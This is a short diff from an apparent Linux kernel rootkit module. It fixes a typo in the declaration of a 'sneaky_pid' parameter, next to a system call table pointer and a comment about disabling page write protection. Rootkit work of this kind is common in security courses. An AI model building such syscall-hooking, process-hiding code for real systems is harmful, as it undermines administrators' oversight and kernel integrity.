@@ -16,7 +16,7 @@
 static unsigned long *sys_call_table;
 
 static char * sneaky_pid = "";
-module_para(sneaky_pid, charp, 0);
+module_param(sneaky_pid, charp, 0);
 //module_param_string(sneaky_pid, sneaky_pid, 20, 0);
 
 // Helper functions, turn on and off the PTE address protection mode
